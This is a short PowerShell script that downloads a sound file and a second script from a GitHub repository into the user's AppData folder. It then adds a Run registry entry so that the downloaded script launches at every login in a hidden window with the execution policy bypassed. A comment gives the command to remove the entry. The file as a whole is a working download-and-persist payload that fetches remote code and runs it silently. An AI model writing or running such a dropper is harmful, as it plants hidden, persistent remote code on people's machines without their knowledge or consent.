$file1 = "$env:APPDATA\\Microsoft\Windows\PowerShell\ranch.wav"
$file2 = "$env:APPDATA\\Microsoft\Windows\PowerShell\test.ps1"

$download1 = (New-Object Net.WebClient).DownloadFile("https://raw.githubusercontent.com/biltmire/ElRancho/master/ranch.wav",$file1)
$download2 = (New-Object Net.WebClient).DownloadFile("https://raw.githubusercontent.com/biltmire/ElRancho/master/test.ps1",$file2)

New-ItemProperty -Path HKCU:Software\Microsoft\Windows\CurrentVersion\Run\ -Name Ranch -PropertyType String -Value "powershell -windowstyle hidden -executionpolicy bypass $env:APPDATA\Microsoft\Windows\PowerShell\test.ps1" -force
#Remove with Remove-ItemProperty -Path HKCU:Software\Microsoft\Windows\CurrentVersion\Run\ -Name Ranch -Force
